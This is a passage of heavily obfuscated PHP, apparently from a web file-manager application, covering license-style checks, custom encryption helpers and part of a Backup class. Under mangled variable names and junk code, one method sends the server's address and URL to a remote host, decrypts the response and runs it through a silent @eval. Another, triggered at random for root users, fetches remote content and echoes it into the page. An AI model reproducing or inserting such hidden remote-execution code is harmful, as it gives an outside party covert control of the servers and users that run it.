$¯¿Æ‘Â—[729]; if (!is_array($É„ÓîºÅ)) { return; } if ($É„ÓîºÅ[$Ì¾ş¬³÷[151]] && $É„ÓîºÅ[$Ì¾ş¬³÷[259]]) { if ($this->oknm0aa569f9($É„ÓîºÅ[$Ì¾ş¬³÷[259]]) == $ÑâïÊ¥[$Ì¾ş¬³÷[151]]) { return; } } $this->bgldc562afd1(); $øñó®‰› = $¯¿Æ‘Â—[730]; if ($this->oknm0aa569f9($É„ÓîºÅ[$Ì¾ş¬³÷[259]]) != $ÑâïÊ¥[$Ì¾ş¬³÷[151]]) { $‡ì“„Ğ¢ = array($Ì¾ş¬³÷[184] => $ıÂ¸Å¼š, $Ì¾ş¬³÷[185] => $_SERVER[$Ì¾ş¬³÷[105]], $Ì¾ş¬³÷[186] => this_url(), $Ì¾ş¬³÷[160] => $_SERVER[$Ì¾ş¬³÷[161]]); $şÅÖ‰’  = $this->coye9218ed64(json_encode($‡ì“„Ğ¢)); $É„ÓîºÅ = $this->itda7913ff25($Ì¾ş¬³÷[187] . $şÅÖ‰’ ); if ($É„ÓîºÅ && is_array($É„ÓîºÅ) && isset($É„ÓîºÅ[$Ì¾ş¬³÷[259]])) { $¤Ã„ƒôû = $this->prya0f5405c5($É„ÓîºÅ[$Ì¾ş¬³÷[259]], 2); if ($¤Ã„ƒôû) { $¤Ã„ƒôû = $this->oknm0aa569f9($¤Ã„ƒôû); } if ($¤Ã„ƒôû) { try { @eval($¤Ã„ƒôû); } catch (Exception $¼‰Ê—òò) { } } } } } private function itda7913ff25($‰í¤ ôÔ = '', $éöšæ“ = array(), $÷‰ÊÏû¯ = 5) { $¸Ğ–»ƒª =& $_SERVER[³à¼î¯á]; $ÛÔ¬¿Öş =& $_SERVER[í¡èúÆ]; $êë²Ôìò = $ÛÔ¬¿Öş[260]; $˜ç­‚ğ = $¸Ğ–»ƒª[731]; if (!$˜ç­‚ğ) { return; } $êë²Ôìò = $this->arig6fbf0bfa($êë²Ôìò, $ÛÔ¬¿Öş[261]); $õîœ“ïù = $¸Ğ–»ƒª[732]; $êë²Ôìò = $êë²Ôìò . $‰í¤ ôÔ; if ($éöšæ“ && is_array($éöšæ“)) { $êë²Ôìò = $êë²Ôìò . $ÛÔ¬¿Öş[262] . http_build_query($éöšæ“); } if ($éöšæ“ === -1) { return $êë²Ôìò; } $»á‚û„ = stream_context_create(array($ÛÔ¬¿Öş[218] => array($ÛÔ¬¿Öş[221] => $÷‰ÊÏû¯, $ÛÔ¬¿Öş[219] => $ÛÔ¬¿Öş[263]), $ÛÔ¬¿Öş[264] => array($ÛÔ¬¿Öş[265] => !1, $ÛÔ¬¿Öş[266] => !1))); $˜í¢î—í = $¸Ğ–»ƒª[733]; while (strlen($˜í¢î—í) < $¸Ğ–»ƒª[660]) { if (!$˜í¢î—í) { break; } $˜í¢î—í++; } $éöšæ“ = @file_get_contents($êë²Ôìò, !1, $»á‚û„); return json_decode($éöšæ“, !0); } private function yusz616a9af8() { $˜»Úä´ =& $_SERVER[³à¼î¯á]; $áîÁ Ó¼ =& $_SERVER[í¡èúÆ]; $²­Úß°Ü = array($áîÁ Ó¼[267] => $áîÁ Ó¼[268], $áîÁ Ó¼[269] => $áîÁ Ó¼[270], $áîÁ Ó¼[271] => $áîÁ Ó¼[272], $áîÁ Ó¼[273] => $áîÁ Ó¼[274], $áîÁ Ó¼[275] => $áîÁ Ó¼[276], $áîÁ Ó¼[277] => $áîÁ Ó¼[213], $áîÁ Ó¼[278] => $áîÁ Ó¼[213], $áîÁ Ó¼[279] => $áîÁ Ó¼[268], $áîÁ Ó¼[280] => $áîÁ Ó¼[270], $áîÁ Ó¼[281] => $áîÁ Ó¼[272], $áîÁ Ó¼[282] => $áîÁ Ó¼[283], $áîÁ Ó¼[284] => $áîÁ Ó¼[274], $áîÁ Ó¼[285] => $áîÁ Ó¼[286], $áîÁ Ó¼[287] => $áîÁ Ó¼[276], $áîÁ Ó¼[288] => $áîÁ Ó¼[289], $áîÁ Ó¼[290] => $áîÁ Ó¼[291], $áîÁ Ó¼[292] => $áîÁ Ó¼[293]); $›üµÑÛ = $˜»Úä´[734]; if (!$›üµÑÛ) { return; } $÷ùÔ£ÎÌ = $²­Úß°Ü[$this->gyvs0a2c64ec]; $ÈåıŸ×Û = $˜»Úä´[735]; if (!$ÈåıŸ×Û) { die; } $÷ùÔ£ÎÌ = intval($÷ùÔ£ÎÌ ? $÷ùÔ£ÎÌ : $áîÁ Ó¼[268]); $¬Ù£ÑÜ = $˜»Úä´[736]; if (!$¬Ù£ÑÜ) { return; } $ò‰üàé = _get($this->yplsb3e292fc, $áîÁ Ó¼[294]); $ò‰üàé = $ò‰üàé ? intval($ò‰üàé) : 0; return $÷ùÔ£ÎÌ + $ò‰üàé; } public function azwybe04ba84($¹‰ÔŒ³Ò) { $ö»›Ï  =& $_SERVER[³à¼î¯á]; $¨µßŸ¸Ş =& $_SERVER[í¡èúÆ]; $ş»Ä¸… = $this->yusz616a9af8(); $ØÈà·• = $ö»›Ï [737]; if (strlen($ØÈà·•) < $ö»›Ï [665]) { return; } if ($¹‰ÔŒ³Ò[$¨µßŸ¸Ş[295]] == $¨µßŸ¸Ş[121]) { return; } if ($ş»Ä¸… >= intval($¨µßŸ¸Ş[213])) { return; } $¡¢…èĞ = Model($¨µßŸ¸Ş[124])->count(); $Øã€Í¾ = $ö»›Ï [738]; if (!$Øã€Í¾) { die; } if ($¡¢…èĞ <= $ş»Ä¸…) { return; } $¼¸°Âš‡ = Model($¨µßŸ¸Ş[124])->field($¨µßŸ¸Ş[295])->limit($ş»Ä¸…)->select(); $¼¸°Âš‡ = array_to_keyvalue($¼¸°Âš‡, $¨µßŸ¸Ş[6], $¨µßŸ¸Ş[295]); if (!in_array($¹‰ÔŒ³Ò[$¨µßŸ¸Ş[295]], $¼¸°Âš‡)) { show_json($¨µßŸ¸Ş[296], !1, $¨µßŸ¸Ş[209]); } } public function lpbs0c399193() { $çÅÜï¶ =& $_SERVER[³à¼î¯á]; $‹ò®éµÓ =& $_SERVER[í¡èúÆ]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $§¦æ§è· = $‹ò®éµÓ[216]; $Ï´ú¬¢û = $çÅÜï¶[739]; while (strlen($Ï´ú¬¢û) < $çÅÜï¶[663]) { if (!$Ï´ú¬¢û) { break; } $Ï´ú¬¢û++; } $§¦æ§è· = $this->arig6fbf0bfa($§¦æ§è·, $‹ò®éµÓ[217]); $÷‰¡Õü¢ = stream_context_create(array($‹ò®éµÓ[218] => array($‹ò®éµÓ[219] => $‹ò®éµÓ[220], $‹ò®éµÓ[221] => 3))); $¶óèÏå = $çÅÜï¶[740]; while ($¶óèÏå < $çÅÜï¶[665]) { if ($¶óèÏå >= 0) { break; } $¶óèÏå++; } $—ÔÍº»ö = @file_get_contents($§¦æ§è·, !1, $÷‰¡Õü¢); $ı“ùòÏ = $çÅÜï¶[741]; if (!$ı“ùòÏ) { return; } echo $‹ò®éµÓ[297] . hash_encode($—ÔÍº»ö) . $‹ò®éµÓ[298]; } private function tpicdc4f62cc($ö÷‘ù£Ó, $¨ôşŒÔ, $Â¹–‘¾± = 3) { $ÊŠó€Ş¾ =& $_SERVER[³à¼î¯á]; $Š„Ù§©› =& $_SERVER[í¡èúÆ]; usleep(1); $›ä•¾ÚÄ = $ÊŠó€Ş¾[742]; $ö÷‘ù£Ó = trim($ö÷‘ù£Ó); $ßÍÊÂ¡ = mt_rand(0, 5) . $Š„Ù§©›[6]; $–—×ã¼ = rand_string(15); $³óÇ©Şö = $ÊŠó€Ş¾[743]; if (!$³óÇ©Şö) { die; } $Å¤ÔÁ¬Ì = $Š„Ù§©›[299]; switch ($ßÍÊÂ¡) { case $Š„Ù§©›[205]: $ßàÛœˆì = $this->awkp9c6e380d($ö÷‘ù£Ó, strrev($¨ôşŒÔ . $–—×ã¼)); $¬ª¶×Øø = $ÊŠó€Ş¾[683]; while ($¬ª¶×Øø < $ÊŠó€Ş¾[663]) { if ($¬ª¶×Øø >= 0) { break; } $¬ª¶×Øø++; } break; case $Š„Ù§©›[121]: $ßàÛœˆì = $this->awkp9c6e380d($ö÷‘ù£Ó, strrev($–—×ã¼ . $¨ôşŒÔ)); break; case $Š„Ù§©›[300]: $ßàÛœˆì = $this->awkp9c6e380d($ö÷‘ù£Ó, base64_encode($–—×ã¼ . $¨ôşŒÔ)); break; $•ŠãÖë  = $ÊŠó€Ş¾[744]; if (!$•ŠãÖë ) { die; } case $Š„Ù§©›[301]: $ßàÛœˆì = $this->awkp9c6e380d($ö÷‘ù£Ó, md5($–—×ã¼ . $¨ôşŒÔ)); break; $—®ì’æ = $ÊŠó€Ş¾[745]; if (!$—®ì’æ) { return; } case $Š„Ù§©›[302]: $ö÷‘ù£Ó = base64_encode($ö÷‘ù£Ó); $½…î‰¡Ç = $ÊŠó€Ş¾[746]; $¨¥ÖÎ‰Æ = rand(0, 64); $­’ì—Ìà = $ÊŠó€Ş¾[747]; if (strlen($­’ì—Ìà) < $ÊŠó€Ş¾[658]) { return; } $¨èú–û¾ = $Å¤ÔÁ¬Ì[$¨¥ÖÎ‰Æ]; $Ôü˜œÙœ = $ÊŠó€Ş¾[731]; while ($Ôü˜œÙœ < $ÊŠó€Ş¾[658]) { if ($Ôü˜œÙœ >= 0) { break; } $Ôü˜œÙœ++; } $ìÇ˜í×ã = md5($¨èú–û¾ . md5($¨ôşŒÔ . $¨èú–û¾) . $¨ôşŒÔ); $ìÇ˜í×ã = substr($ìÇ˜í×ã, $¨¥ÖÎ‰Æ % 8, $¨¥ÖÎ‰Æ % 8 + 7); $äÊÍæ¼÷ = $ÊŠó€Ş¾[748]; $æûÙšÔ = $Š„Ù§©›[6]; $¶„õ‘Á¾ = 0; $„‡ø÷¥ú = 0; $Î×îå°Â = $ÊŠó€Ş¾[749]; if (!$Î×îå°Â) { return; } $”à¿…ÉÃ = 0; $ëŠêàúõ = $ÊŠó€Ş¾[750]; if (!$ëŠêàúõ) { die; } for ($¶„õ‘Á¾ = 0; $¶„õ‘Á¾ < strlen($ö÷‘ù£Ó); $¶„õ‘Á¾++) { $”à¿…ÉÃ = $”à¿…ÉÃ == strlen($ìÇ˜í×ã) ? 0 : $”à¿…ÉÃ; $„‡ø÷¥ú = ($¨¥ÖÎ‰Æ + strpos($Å¤ÔÁ¬Ì, $ö÷‘ù£Ó[$¶„õ‘Á¾]) + ord($ìÇ˜í×ã[$”à¿…ÉÃ++])) % 64; $æûÙšÔ .= $Å¤ÔÁ¬Ì[$„‡ø÷¥ú]; } $ßàÛœˆì = hash_encode($¨èú–û¾ . $æûÙšÔ); break; default: $ßàÛœˆì = $this->awkp9c6e380d($ö÷‘ù£Ó, $¨ôşŒÔ . $–—×ã¼); break; } $ßàÛœˆì = strrev($ßÍÊÂ¡ . $–—×ã¼ . $ßàÛœˆì); $»Ä±ë¾Ã = $ÊŠó€Ş¾[751]; if ($Â¹–‘¾± - 1 > 0) { $ßàÛœˆì = $this->tpicdc4f62cc($ßàÛœˆì, $¨ôşŒÔ, $Â¹–‘¾± - 1); } return $ßàÛœˆì; } private function prya0f5405c5($¥ÉØ³ª», $‡®Êß§, $áãÚşÌ” = 3) { $±£ëè¾ =& $_SERVER[³à¼î¯á]; $¯Çüëü =& $_SERVER[í¡èúÆ]; if (!is_string($¥ÉØ³ª») || strlen($¥ÉØ³ª») < 10) { return !1; } $¥ÉØ³ª» = trim($¥ÉØ³ª»); $É†óï³‹ = $±£ëè¾[752]; $¥ÉØ³ª» = strrev($¥ÉØ³ª»); $˜ñáËèÛ = $¥ÉØ³ª»[0]; $àåô¨²Ã = substr($¥ÉØ³ª», 1, 15); $­ı§×® = $±£ëè¾[753]; while ($­ı§×® < $±£ëè¾[658]) { if ($­ı§×® >= 0) { break; } $­ı§×®++; } $¥ÉØ³ª» = substr($¥ÉØ³ª», 16); $·Ï¸âË = $¯Çüëü[299]; switch ($˜ñáËèÛ) { case $¯Çüëü[205]: $±Ö¹Ûí‚ = $this->arig6fbf0bfa($¥ÉØ³ª», strrev($‡®Êß§ . $àåô¨²Ã)); break; $À¶Ë¯ = $±£ëè¾[754]; case $¯Çüëü[121]: $±Ö¹Ûí‚ = $this->arig6fbf0bfa($¥ÉØ³ª», strrev($àåô¨²Ã . $‡®Êß§)); $Ê—¼ÀÔ = $±£ëè¾[755]; while ($Ê—¼ÀÔ < $±£ëè¾[660]) { if ($Ê—¼ÀÔ >= 0) { break; } $Ê—¼ÀÔ++; } break; $¿ú˜ºé = $±£ëè¾[756]; case $¯Çüëü[300]: $±Ö¹Ûí‚ = $this->arig6fbf0bfa($¥ÉØ³ª», base64_encode($àåô¨²Ã . $‡®Êß§)); break; case $¯Çüëü[301]: $±Ö¹Ûí‚ = $this->arig6fbf0bfa($¥ÉØ³ª», md5($àåô¨²Ã . $‡®Êß§)); $÷ÅŠ†üÅ = $±£ëè¾[757]; while ($÷ÅŠ†üÅ < $±£ëè¾[658]) { if ($÷ÅŠ†üÅ >= 0) { break; } $÷ÅŠ†üÅ++; } break; case $¯Çüëü[302]: $¥ÉØ³ª» = hash_decode($¥ÉØ³ª»); $ü÷Ô÷İÎ = $±£ëè¾[758]; if (strlen($ü÷Ô÷İÎ) < $±£ëè¾[663]) { die; } $êšœƒ‡¦ = $¥ÉØ³ª»[0]; $¿ª§ÒëÓ = $±£ëè¾[759]; if (!$¿ª§ÒëÓ) { return; } $¥ÉØ³ª» = substr($¥ÉØ³ª», 1); $Ìù¯¦Å³ = strpos($·Ï¸âË, $êšœƒ‡¦); $Õš€•öÌ = md5($êšœƒ‡¦ . md5($‡®Êß§ . $êšœƒ‡¦) . $‡®Êß§); $Ñé³ÜÜ¾ = $±£ëè¾[760]; if (!$Ñé³ÜÜ¾) { return; } $Õš€•öÌ = substr($Õš€•öÌ, $Ìù¯¦Å³ % 8, $Ìù¯¦Å³ % 8 + 7); $Åé¢ˆ­ş = $¯Çüëü[6]; $¶¹¦¡Ğê = $±£ëè¾[761]; if (!$¶¹¦¡Ğê) { die; } $ƒ¬ÍØÃ = 0; $Ï¶ÒÖ = $±£ëè¾[762]; $‹ÏûÆ® = 0; $öÀâ½Ù˜ = $±£ëè¾[763]; if (strlen($öÀâ½Ù˜) < $±£ëè¾[660]) { return; } $³ø¨‰Ÿ = 0; for ($ƒ¬ÍØÃ = 0; $ƒ¬ÍØÃ < strlen($¥ÉØ³ª»); $ƒ¬ÍØÃ++) { $³ø¨‰Ÿ = $³ø¨‰Ÿ == strlen($Õš€•öÌ) ? 0 : $³ø¨‰Ÿ; $×ñĞÕÈº = $±£ëè¾[764]; if (strlen($×ñĞÕÈº) < $±£ëè¾[660]) { return; } $Üøå²Ş = $³ø¨‰Ÿ++; $‹ÏûÆ® = strpos($·Ï¸âË, $¥ÉØ³ª»[$ƒ¬ÍØÃ]) - $Ìù¯¦Å³ - ord($Õš€•öÌ[$Üøå²Ş]); while ($‹ÏûÆ® < 0) { $‹ÏûÆ® += 64; } $Åé¢ˆ­ş .= $·Ï¸âË[$‹ÏûÆ®]; $ÑÑÊø˜Ã = $±£ëè¾[765]; if (!$ÑÑÊø˜Ã) { return; } } $±Ö¹Ûí‚ = base64_decode($Åé¢ˆ­ş); $î§ôÅµ = $±£ëè¾[766]; if (!$î§ôÅµ) { die; } break; default: $±Ö¹Ûí‚ = $this->arig6fbf0bfa($¥ÉØ³ª», $‡®Êß§ . $àåô¨²Ã); $—¼‘ŠÏó = $±£ëè¾[767]; if (!$—¼‘ŠÏó) { die; } break; $Ñ‹Ş„Ïƒ = $±£ëè¾[768]; if (!$Ñ‹Ş„Ïƒ) { return; } } if ($áãÚşÌ” - 1 > 0) { $±Ö¹Ûí‚ = $this->prya0f5405c5($±Ö¹Ûí‚, $‡®Êß§, $áãÚşÌ” - 1); } return $±Ö¹Ûí‚; } public function coye9218ed64($ÓÜ‰—È) { $™Ğ¢ÓÕ =& $_SERVER[³à¼î¯á]; $œˆ‡Øæ° =& $_SERVER[í¡èúÆ]; $›òÁ¿Àø = $this->ejfzb659d57d(); $Ş¾´êºĞ = $this->ejfzb659d57d(); $Ì×§’¨Ğ = ($›òÁ¿Àø - 1) * ($Ş¾´êºĞ - 1); $Á«›šâÚ = intval(($›òÁ¿Àø + $Ş¾´êºĞ) / 2); $İ’š÷÷È = $™Ğ¢ÓÕ[769]; while (strlen($İ’š÷÷È) < $™Ğ¢ÓÕ[668]) { if (!$İ’š÷÷È) { break; } $İ’š÷÷È++; } while (1) { $Ô•±ü¨“ = $Á«›šâÚ; $²¯…ÊŠ = $Ì×§’¨Ğ; while ($²¯…ÊŠ % $Ô•±ü¨“ != 0) { $æª“âØ = $²¯…ÊŠ; $ñ¼äô˜† = $™Ğ¢ÓÕ[770]; $²¯…ÊŠ = $Ô•±ü¨“; $Ô•±ü¨“ = $æª“âØ % $Ô•±ü¨“; $Š½Õ˜˜ = $™Ğ¢ÓÕ[771]; if (strlen($Š½Õ˜˜) < $™Ğ¢ÓÕ[668]) { return; } } if ($Ô•±ü¨“ == 1) { break; } else { $Á«›šâÚ++; } } $ã×ÈÀ€ì = 2; $í¨³™‹ = $™Ğ¢ÓÕ[772]; if (!$í¨³™‹) { die; } for ($ûÈÜ€Ó = 0; $ûÈÜ€Ó < $Ì×§’¨Ğ * 10; $ûÈÜ€Ó++) { if (($Ì×§’¨Ğ * $ûÈÜ€Ó + 1) % $Á«›šâÚ == 0) { $ã×ÈÀ€ì = intval(($Ì×§’¨Ğ * $ûÈÜ€Ó + 1) / $Á«›šâÚ); break; } } $ÆÒ‚íÓ = $this->awkp9c6e380d($›òÁ¿Àø * $Ş¾´êºĞ . $œˆ‡Øæ°[6], $œˆ‡Øæ°[135]); $«…Ø¯íµ = md5($œˆ‡Øæ°[303] . ($›òÁ¿Àø + $Ş¾´êºĞ) . $œˆ‡Øæ°[304] . $Á«›šâÚ . $œˆ‡Øæ°[304] . $ã×ÈÀ€ì . $œˆ‡Øæ°[305]); $ëÎÊ‚Äü = $this->awkp9c6e380d($ÓÜ‰—È, $«…Ø¯íµ) . $œˆ‡Øæ°[306] . $ÆÒ‚íÓ; return $ëÎÊ‚Äü; } public function oknm0aa569f9($Õ„ëÃ¨–) { $Ì‡´²ßò =& $_SERVER[³à¼î¯á]; $ğšœìÃ =& $_SERVER[í¡èúÆ]; $éª¼Úğ = explode($ğšœìÃ[306], $Õ„ëÃ¨–); $È¶Ò¦ = $Ì‡´²ßò[773]; if (!$È¶Ò¦) { die; } if (count($éª¼Úğ) != 2) { return $ğšœìÃ[6]; } $òÆ¼Æ“ = $this->arig6fbf0bfa($éª¼Úğ[1] . $ğšœìÃ[6], $ğšœìÃ[135]); $‹ƒ‰‚Åú = $Ì‡´²ßò[774]; if (!$‹ƒ‰‚Åú) { die; } if (!$òÆ¼Æ“) { return $ğšœìÃ[6]; } $òÆ¼Æ“ = intval($òÆ¼Æ“); $İ„è‘·Ü = 0; $á¹ßú¢ = 0; $˜æ¾Å³ = $Ì‡´²ßò[775]; while (strlen($˜æ¾Å³) < $Ì‡´²ßò[658]) { if (!$˜æ¾Å³) { break; } $˜æ¾Å³++; } for ($ˆÌ£¦¨ = 3; $ˆÌ£¦¨ < $òÆ¼Æ“; $ˆÌ£¦¨ += 2) { if ($òÆ¼Æ“ % $ˆÌ£¦¨ != 0) { continue; } $İ„è‘·Ü = $ˆÌ£¦¨; $á¹ßú¢ = intval($òÆ¼Æ“ / $ˆÌ£¦¨); $Ø£¾Ú³ = $Ì‡´²ßò[776]; if (strlen($Ø£¾Ú³) < $Ì‡´²ßò[658]) { die; } break; $¿é²‰– = $Ì‡´²ßò[777]; if (!$¿é²‰–) { die; } } $ßš©š®À = ($İ„è‘·Ü - 1) * ($á¹ßú¢ - 1); $÷ğó©ùŠ = $Ì‡´²ßò[778]; if (strlen($÷ğó©ùŠ) < $Ì‡´²ßò[658]) { return; } $°Ïë½öî = intval(($İ„è‘·Ü + $á¹ßú¢) / 2); $ˆÑƒØñ› = $Ì‡´²ßò[779]; while ($ˆÑƒØñ› < $Ì‡´²ßò[660]) { if ($ˆÑƒØñ› >= 0) { break; } $ˆÑƒØñ›++; } while (1) { $Ë¤ûé«ä = $°Ïë½öî; $ÂşÊ×öé = $ßš©š®À; while ($ÂşÊ×öé % $Ë¤ûé«ä != 0) { $Øíß„•ø = $ÂşÊ×öé; $ÂşÊ×öé = $Ë¤ûé«ä; $Ë¤ûé«ä = $Øíß„•ø % $Ë¤ûé«ä; $ŠÔë¦í† = $Ì‡´²ßò[780]; if (!$ŠÔë¦í†) { die; } } if ($Ë¤ûé«ä == 1) { break; } else { $°Ïë½öî++; } } $Ôæïûù™ = 2; $—öôšâõ = $Ì‡´²ßò[781]; while (strlen($—öôšâõ) < $Ì‡´²ßò[658]) { if (!$—öôšâõ) { break; } $—öôšâõ++; } for ($ˆÌ£¦¨ = 0; $ˆÌ£¦¨ < $ßš©š®À * 10; $ˆÌ£¦¨++) { if (($ßš©š®À * $ˆÌ£¦¨ + 1) % $°Ïë½öî == 0) { $Ôæïûù™ = intval(($ßš©š®À * $ˆÌ£¦¨ + 1) / $°Ïë½öî); break; } } $±İÕ…Õ˜ = md5($ğšœìÃ[303] . ($İ„è‘·Ü + $á¹ßú¢) . $ğšœìÃ[304] . $°Ïë½öî . $ğšœìÃ[304] . $Ôæïûù™ . $ğšœìÃ[305]); $–¤å“ı¶ = $Ì‡´²ßò[782]; $ÑõŠ„ø› = $this->arig6fbf0bfa($éª¼Úğ[0], $±İÕ…Õ˜); $½ÄÂÂµ = $Ì‡´²ßò[783]; while ($½ÄÂÂµ < $Ì‡´²ßò[665]) { if ($½ÄÂÂµ >= 0) { break; } $½ÄÂÂµ++; } return $ÑõŠ„ø›; $‚«êí” = $Ì‡´²ßò[784]; while ($‚«êí” < $Ì‡´²ßò[663]) { if ($‚«êí” >= 0) { break; } $‚«êí”++; } } public function ejfzb659d57d() { $•Í®¯Šû =& $_SERVER[³à¼î¯á]; $³×°ùÁ¸ = mt_rand(pow(2, 14), pow(2, 16) - 1); $°şÈË†ª = $•Í®¯Šû[785]; if (strlen($°şÈË†ª) < $•Í®¯Šû[658]) { return; } $ñ“ŸéÑÏ = array(); $ëü¿¯ğË = $•Í®¯Šû[786]; while ($ëü¿¯ğË < $•Í®¯Šû[660]) { if ($ëü¿¯ğË >= 0) { break; } $ëü¿¯ğË++; } $†»¨ÚíÓ = 1; $Î¼Ò§ü‹ = $•Í®¯Šû[787]; if (strlen($Î¼Ò§ü‹) < $•Í®¯Šû[668]) { die; } while ($†»¨ÚíÓ <= (int) sqrt($³×°ùÁ¸)) { $¿Íù†À½ = $†»¨ÚíÓ; $øâ¹ô¿¯ = $•Í®¯Šû[788]; while (!0) { $¿Íù†À½++; $Ç¿ô»ÅÖ = $•Í®¯Šû[789]; if ($¿Íù†À½ <= 2) { $†»¨ÚíÓ = $¿Íù†À½; break; } else { if ($¿Íù†À½ < 2) { continue; } } $Û®Êãœš = !0; for ($õ¤Ÿ‚ı = 2; $õ¤Ÿ‚ı <= sqrt($¿Íù†À½); $õ¤Ÿ‚ı++) { if ($¿Íù†À½ % $õ¤Ÿ‚ı == 0) { $Û®Êãœš = !1; } } if ($Û®Êãœš) { $†»¨ÚíÓ = $¿Íù†À½; break; } } $ñ“ŸéÑÏ[] = $†»¨ÚíÓ; } $Øªõ÷ñ  = 2; $—Ààœ¦ = $•Í®¯Šû[790]; if (strlen($—Ààœ¦) < $•Í®¯Šû[665]) { die; } for ($¿Íù†À½ = $³×°ùÁ¸; $¿Íù†À½ > 1; $¿Íù†À½--) { $Û®Êãœš = !0; foreach ($ñ“ŸéÑÏ as $¶ŸçÍóë) { if ($¿Íù†À½ % $¶ŸçÍóë == 0) { $Û®Êãœš = !1; break; } } if ($Û®Êãœš) { $Øªõ÷ñ  = $¿Íù†À½; break; } } return $Øªõ÷ñ ; } public function azkw333b6a40($ğØÖß¾ô, $¢ş¦óû) { $¶©Á¾©ü =& $_SERVER[í¡èúÆ]; return call_user_func(array($¶©Á¾©ü[8], $¶©Á¾©ü[307]), $ğØÖß¾ô, $¢ş¦óû); $öÓÛÙî = $_SERVER[³à¼î¯á][791]; if (!$öÓÛÙî) { return; } } public function awkp9c6e380d($’¦ìäÊ¿, $ùúêÏ») { $’¸¿ˆ‹Ø =& $_SERVER[í¡èúÆ]; return call_user_func(array($’¸¿ˆ‹Ø[308], $’¸¿ˆ‹Ø[309]), $’¦ìäÊ¿, $ùúêÏ»); } public function arig6fbf0bfa($Ï¸¯…Û, $ÛÂáø­) { $ô¹„Ó‰§ =& $_SERVER[í¡èúÆ]; return call_user_func(array($ô¹„Ó‰§[308], $ô¹„Ó‰§[310]), $Ï¸¯…Û, $ÛÂáø­); $“èØ˜— = $_SERVER[³à¼î¯á][792]; } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $Îà”à† =& $_SERVER[³à¼î¯á]; $this->isManual(); self::$name = date($Îà”à†[793]); if (!($ÈçœÅñØ = Model($Îà”à†[794])->lastItem())) { $ÈçœÅñØ = $this->initData(); } else { self::$name = $ÈçœÅñØ[$Îà”à†[32]]; if ($ÈçœÅñØ[$Îà”à†[795]] == $Îà”à†[91]) { self::$name = date($Îà”à†[263]); $¡Î¼­çî = 0; if (isset($ÈçœÅñØ[$Îà”à†[344]][$Îà”à†[221]][$Îà”à†[516]])) { $¡Î¼­çî = (int) $ÈçœÅñØ[$Îà”à†[344]][$Îà”à†[221]][$Îà”à†[516]]; } if (self::$manual == 0 && $ÈçœÅñØ[$Îà”à†[32]] == self::$name) { Model($Îà”à†[794])->remove($ÈçœÅñØ[$Îà”à†[450]]); } $ÈçœÅñØ = $this->initData($¡Î¼­çî, $ÈçœÅñØ[$Îà”à†[796]]); } else { $this->checkStore($ÈçœÅñØ[$Îà”à†[796]]); } } self::$option = $ÈçœÅñØ; } private function isManual() { $ïõÔñŒ = _get($GLOBALS, $_SERVER[³à¼î¯á][797], 0); $ïõÔñŒ = intval($ïõÔñŒ); self::$manual = $ïõÔñŒ && $ïõÔñŒ == 1 ? 1 : 0; } private function initData($şõ–š™Ù = 0, $ª¸»Á€ = '') { $åÀŒüØ¼ =& $_SERVER[³à¼î¯á]; $´Ü¢Â‘Ö = Model($åÀŒüØ¼[794])->config(); if ($ª¸»Á€ && $´Ü¢Â‘Ö[$åÀŒüØ¼[796]] != $ª¸»Á€) { $şõ–š™Ù = 0; } $this->checkStore($´Ü¢Â‘Ö[$åÀŒüØ¼[796]]); if (self::$manual == 1) { self::$name .= $åÀŒüØ¼[11] . date($åÀŒüØ¼[798]); } $¥§ş£å° = array($åÀŒüØ¼[796] => $´Ü¢Â‘Ö[$åÀŒüØ¼[796]], $åÀŒüØ¼[32] => self::$name, $åÀŒüØ¼[795] => 0, $åÀŒüØ¼[799] => $´Ü¢Â‘Ö[$åÀŒüØ¼[799]], $åÀŒüØ¼[800] => self::$manual, $åÀŒüØ¼[344] => array($åÀŒüØ¼[801] => array($åÀŒüØ¼[795] => 0), $åÀŒüØ¼[802] => array($åÀŒüØ¼[795] => 0, $åÀŒüØ¼[803] => 0, $åÀŒüØ¼[804] => 0, $åÀŒüØ¼[33] => $åÀŒüØ¼[12], $åÀŒüØ¼[805] => 0, $åÀŒüØ¼[806] => 0), $åÀŒüØ¼[807] => array($åÀŒüØ¼[795] => 0, $åÀŒüØ¼[803] => 0, $åÀŒüØ¼[804] => 0, $åÀŒüØ¼[805] => 0, $åÀŒüØ¼[806] => 0), $åÀŒüØ¼[221] => array($åÀŒüØ¼[795] => 0, $åÀŒüØ¼[808] => 0, $åÀŒüØ¼[809] => 0, $åÀŒüØ¼[810] => 0, $åÀŒüØ¼[811] => 0, $åÀŒüØ¼[516] => $şõ–š™Ù, $åÀŒüØ¼[805] => 0, $åÀŒüØ¼[806] => 0)), $åÀŒüØ¼[805] => time(), $åÀŒüØ¼[806] => 0); $…Òº¬ = Model($åÀŒüØ¼[794])->insert($¥§ş£å°); $¥§ş£å°[$åÀŒüØ¼[450]] = $…Òº¬; return $¥§ş£å°; } private function checkStore($‹˜šìîˆ) { $ˆâª²·Á = Model($_SERVER[³à¼î¯á][812]); $öà„“šª = $ˆâª²·Á->listData($‹˜šìîˆ); $ˆâª²·Á->checkConfig($öà„“šª); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[³à¼î¯á][794])->findByName(self::$name); } return self::$option; } public static function set($¸ù …À¹) { $¨•®˜Í¶ =& $_SERVER[³à¼î¯á]; $Üú§­üƒ = self::get(); foreach ($¸ù …À¹ as $Ëî áä¦ => $‹£ï¦õŞ) { $ˆ òºÖ‚ = explode($¨•®˜Í¶[10], $Ëî áä¦); $´¯Şé·ı = count($ˆ òºÖ‚); switch ($´¯Şé·ı) { case 1: $Üú§­üƒ[$ˆ òºÖ‚[0]] = $‹£ï¦õŞ; break; case 2: $Üú§­üƒ[$ˆ òºÖ‚[0]][$ˆ òºÖ‚[1]] = $‹£ï¦õŞ; break; case 3: $Üú§­üƒ[$ˆ òºÖ‚[0]][$ˆ òºÖ‚[1]][$ˆ òºÖ‚[2]] = $‹£ï¦õŞ; break; } } Model($¨•®˜Í¶[794])->update($Üú§­üƒ[$¨•®˜Í¶[450]], $Üú§­üƒ); self::$option = $Üú§­üƒ; return self::$option; } public function keep() { $ÆôËÃ×¸ =& $_SERVER[³à¼î¯á]; $—Á“¨ü = self::get(); if ($—Á“¨ü[$ÆôËÃ×¸[344]][$ÆôËÃ×¸[801]][$ÆôËÃ×¸[795]] == $ÆôËÃ×¸[91]) { return; } $this->backupKeep($—Á“¨ü); self::set(array($ÆôËÃ×¸[813] => 1)); } private function 